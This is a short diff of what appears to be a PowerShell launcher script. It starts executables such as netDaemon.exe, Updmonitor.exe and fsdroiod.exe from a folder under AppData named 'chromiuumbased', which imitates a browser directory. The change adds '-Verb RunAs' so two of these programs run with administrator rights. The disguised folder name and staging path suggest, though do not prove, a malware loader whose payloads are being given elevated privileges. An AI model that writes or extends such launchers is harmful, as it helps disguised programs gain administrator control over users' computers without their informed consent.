@@ -14,5 +14,5 @@ Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
 Timeout /NOBREAK /T 5
 Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
 Timeout /NOBREAK /T 5
-Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\Updmonitor.exe"
-Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\fsdroiod.exe"
+Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\Updmonitor.exe" -Verb RunAs
+Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\fsdroiod.exe" -Verb RunAs
